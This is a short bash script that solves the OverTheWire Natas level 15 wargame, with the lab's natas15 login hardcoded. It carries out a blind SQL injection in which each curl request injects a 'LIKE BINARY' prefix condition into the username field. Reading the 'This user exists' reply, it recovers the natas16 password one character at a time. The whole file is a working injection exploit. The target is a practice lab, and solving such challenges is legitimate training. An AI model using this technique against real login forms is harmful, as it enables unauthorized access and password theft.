#!/bin/bash

URL="http://natas15.natas.labs.overthewire.org/"
AUTH="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password=""

for i in $(seq 1 32); do
  for c in $(echo $chars | fold -w1); do

    attempt="${password}${c}"

    response=$(curl -s -u $AUTH \
      --data "username=natas16\" AND password LIKE BINARY \"${attempt}%\" #" \
      "$URL")

    if echo "$response" | grep -q "This user exists"; then
      password+=$c
      echo "[+] $password (${#password}/32)"
      break
    fi

  done
done

echo "[✔] Password: $password"